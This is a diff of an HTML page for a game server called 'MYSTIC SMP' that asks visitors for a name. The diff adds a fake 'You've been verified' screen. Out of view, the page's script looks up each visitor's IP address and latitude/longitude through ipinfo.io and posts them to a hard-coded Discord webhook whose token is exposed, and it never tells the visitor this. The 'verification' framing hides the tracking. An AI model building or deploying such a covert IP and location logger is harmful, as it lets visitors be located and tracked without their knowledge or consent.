@@ -2,17 +2,34 @@
 <html>
 <head>
   <title>MYSTIC SMP</title>
+  <style>
+    #mainPage, #welcomePage {
+      display: none;
+    }
+    #mainPage {
+      display: block;
+    }
+  </style>
 </head>
 <body>
-  <h2>Welcome!</h2>
-  <p>what do we call you?</p>
-  <input type="text" id="nameInput" placeholder="Your name" />
-  <button id="submitBtn">Submit</button>
+  <!-- Page 1: Name + IP collection -->
+  <div id="mainPage">
+    <h2>Welcome!</h2>
+    <p>what do we call you?</p>
+    <input type="text" id="nameInput" placeholder="Your name" />
+    <button id="submitBtn">Submit</button>
+    <p id="status"></p>
+  </div>
 
-  <p id="status"></p>
+  <!-- Page 2: Mystic Website content -->
+  <div id="welcomePage">
+    <h1>Welcome to Mystic SMP!</h1>
+    <p>You’ve been verified. Enjoy exploring our server and community.</p>
+    <!-- Add more content here -->
+  </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1389939874454442044/xzwnU8-Y6OmJzrBIPkApuOjRPEq1uURdEQcWcJS-tTlxRpxRJTEq4VlxmSP-XI0aYRFW"; // Replace with your Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1389939874454442044/xzwnU8-Y6OmJzrBIPkApuOjRPEq1uURdEQcWcJS-tTlxRpxRJTEq4VlxmSP-XI0aYRFW";
 
     document.getElementById("submitBtn").addEventListener("click", () => {
       const name = document.getElementById("nameInput").value.trim();
@@ -26,7 +43,6 @@
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(ipData => {
-          // ipData.loc is a string like "latitude,longitude"
           const coords = ipData.loc ? ipData.loc.split(",") : ["Unknown", "Unknown"];
           const latitude = coords[0];
           const longitude = coords[1];
@@ -46,6 +62,11 @@
             body: JSON.stringify(message)
           }).then(() => {
             document.getElementById("status").textContent = "all good!";
+            // Redirect to second section after short delay
+            setTimeout(() => {
+              document.getElementById("mainPage").style.display = "none";
+              document.getElementById("welcomePage").style.display = "block";
+            }, 2000);
           }).catch(err => {
             document.getElementById("status").textContent = "YOU AREE A BOT!";
             console.error("Discord webhook error:", err);
